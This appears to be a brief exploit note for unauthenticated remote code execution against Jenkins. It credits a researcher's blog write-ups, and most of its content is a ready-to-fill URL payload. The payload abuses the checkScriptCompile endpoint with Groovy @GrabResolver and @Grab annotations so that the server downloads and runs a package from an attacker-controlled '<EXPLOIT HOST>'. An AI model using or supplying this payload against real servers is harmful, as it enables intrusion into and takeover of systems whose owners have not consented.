JENKINS UNAUTHENTICATED REMOTE CODE EXECUTION
---------------------------------------------

Read his write-ups on this exploit here -
Part 1: https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
Part 2: http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
His github: https://github.com/orangetw


URL Payload:
------------
http://<TARGET HOST>/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name='payload', root='http://<EXPLOIT HOST>')%0a
@Grab(group='package', module='payload', version='1')%0a
import Payload;
